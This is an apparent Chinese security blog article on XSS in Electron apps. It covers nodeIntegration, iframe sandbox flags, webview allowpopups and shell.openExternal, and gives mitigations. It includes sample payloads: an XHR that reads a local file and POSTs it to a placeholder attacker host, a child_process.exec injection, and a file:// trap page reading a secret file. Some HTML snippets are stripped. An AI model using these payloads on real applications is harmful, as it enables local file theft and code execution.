  * shell.openExternal 等
##### Electron 的架构问题
  * 浏览器窗口默认支持加载file://
  * 并没有与普通浏览器一般的地址栏
##### 本地文件信息窃取
我们发现在默认情况下，Node 语句是可用的。 但是，如果开发者禁用了 Node 语句：
    // main.js 节选
    win = new BrowserWindow({ webPreferences:{nodeIntegration:false} });
    win.loadURL(`file://${__dirname}/index.html`);
这种情况下，我们注入的 Node 语句不生效，可造成的威胁降低了。 看起来，在创建 BrowserWindow 的时候禁用 Node 语句是必要的。
但是，如果 Node 语句被禁用，Electron 会变得很鸡肋。
如果开发者执意禁止 Node 语句，我们依然不是无计可施的。 以刚刚的 main.js 为例，我们可以通过xhr来做更多的事情。
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file://c:/file.txt", true);
    xhr.onload = () => {
      fetch("http://eveil.hack/",{method:"POST", body:xhr.responseText});
    };
    xhr.send( null );
通过上面的代码，我们可以读取本地文件并将其发送出去。 这使得开发者在牺牲 Electron 的实用性禁用 Node 语句后， XSS 依旧十分强大。
###### iframe 沙盒
iframe 的沙盒可以用于限制 DOM 操作访问沙盒内部，从而降低 XSS 威胁性， 即使是 DOM-Based XSS 在 iframe
中发生，影响也十分有限。 比如如下的情况，在外部控制 iframe 是无效的。
    'test'...">
      ...
      document.querySelector("#sb").contentDocument.querySelector("#msg").innerHTML ="Hello, XSS!alert(1)"; // not work
下面是一些常用的 sandbox params：
  * allow-same-origin 允许作为包含文档的同源内容被处理
  * allow-scripts 允许执行脚本（危险！这意味着 JavaScript 将被正常执行）
  * allow-forms 允许提交表单
  * allow-top-navigation 允许内容被加载到顶层（危险！）
  * allow-popups 允许弹出窗口（危险！）
下面是一个启用allow-popups的例子，以此来说明影响：
    ...">
    ...
      var xss = `require('child_process').exec('calc.exe',null);">Click`;
      document.querySelector("#sb").contentDocument.querySelector("#msg").innerHTML = xss;
在这种情况下，用户一旦点击，就会弹出窗口。 根据默认可执行 Node 语句的特性，弹出计算器。
###### webview 标签的风险
webview 标签是用于在 Electron 中打开其它页面使用的。
  * 不同于 iframe，webview 没有访问 webview 外部途径
  * 不同于 iframe，webview 同样不可以被外部操作 DOM
  * 每一个 webview 都可以被单独地控制是否可以 Node 语句执行
  * 通过allowpopups属性，webview 可以弹出窗口
  * 可以使用`window.open()`、`` 等语句打开新窗口
  * 在 iframe 与 webview 中，对 Node 语句执行的控制是不同的
  * 在 iframe 中，Node 语句一直被禁止执行，而弹出的窗口可以执行
  * 在 webview 中，Node 语句默认被禁止执行，弹出的窗口同样被禁止
  * 在 webview 中，Node 语句执行被设置为允许时，弹出的窗口是允许执行的
  * webview 即使禁止了 Node 语句执行，在preload脚本中的 Node 依然是可用的。
    //preload.js
    window.loadConfig = function(){
      let file = `${__dirname}/config.json`;
      let s = require("fs").readFileSync( file, "utf-8" );
      return JSON.eval( s );
    };
通常情况下，开发者会将存在的 Web App 变为一个 Native App, 然后，在 webview 中启动存在的 Web App.
在这里容易出现的问题是，开发者常常需要使用第三方服务接入此页面。
比如第三方广告、视频播放脚本等，它们具有完整能力。 比如执行任意的 JavaScript、构造假页面、污染页面等， 如果这个 webview 可以使用
Node，那就更有意思了。
通常的应对之策也易于理解：控制第三方内容的权限，比如通过 iframe 沙盒， 但这不适用于某些嵌入式 JavaScript 广告。 对于 Web App
来说，还有地址栏这个东西，可以让用户自己确认站点是否有效；
浏览器的存在和同源策略大大限制了其影响。 但对于 Electron 来说，没有地址栏，这带来了很大的风险。 更重要的是，一旦 Node
语句被允许执行，威胁能力将大大提高。
下面我们介绍如何利用存在allowpopups设置的 webview：
攻击主要原因是在 window.open 中，`file://` 依然可用， 这使得攻击者在可以进行与前文类似的本地文件读取等操作。
    // http://test.cn
    window.open("file://remote-server/share/trap.html");
    // trap.html
    var xhr = new XMLHttpRequest();
    xhr.open( "GET", "file://C:/secret.txt", true );
解决方案很简单：
  * 关掉 allowpopups
  * 如果一定要用，就在 main.js 中进行 url 合法性检查
###### shell.openExternal 与 shell.openItem 的风险
`shell.openExternal` 与 `shell.openItem` 是 Electron 用于打开外部程序的 API。
    const {shell} = require('electron');
    const url = 'http://example.cn/';
    shell.openExternal(url); // 打开系统默认浏览器
    shell.openItem( url );
    let file = 'C:/Users/test/test.txt';
    shell.openExternal( file ); // 打开文件
    shell.openItem( file );
    let file = ''file://C:/Users/test/test.txt';';
    shell.openExternal( file ); // 打开文件
    shell.openItem( file );
常见的情况是 Electron 调用外部浏览器打开，如下：
    webview.on( 'new-window', (e) => {
      shell.openExternal( e.url ); // 系统浏览器打开
    });
此时，如何攻击者可以构造 URL 如下，则可以执行任意程序。 需要注意：此处不能传递参数。
    Click
应对之策也很简单，检查 URL 合法性即可（如匹配协议等）。
#### 结论：
  * Electron 存在 DOM-Based XSS 基本就是一死
  * Electron 随处可见的 Node 执行、外部脚本执行
  * 即使外部脚本被禁了，还可以使用file://进行有效的攻击
#### 参考：
http://utf-8.jp/cb2016/cb-hasegawa-en.pdf
* * *
**扫码关注：二向箔安全**
* * *